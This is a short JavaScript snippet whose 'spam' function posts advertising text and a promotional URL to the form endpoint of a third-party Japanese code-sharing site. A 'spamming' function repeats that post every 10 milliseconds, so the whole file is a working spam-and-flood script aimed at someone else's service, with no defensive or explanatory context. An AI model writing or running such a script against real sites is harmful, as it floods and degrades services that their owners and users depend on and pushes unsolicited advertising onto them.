function spam() {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://futtobecom.stars.ne.jp/3ds/Codes/POST');
    xhr.setRequestHeader('content-type', 'application/x-www-form-urlencoded;charset=UTF-8');
    xhr.send('Area[0]=B1の光&Area[1]=B1&Area[2]=0&Area[3]=0&Area[4]=B1の光公式ホームページ http://b1shine.iiyudana.net/');
}

function spamming() {
    setInterval(spam, 10);
}
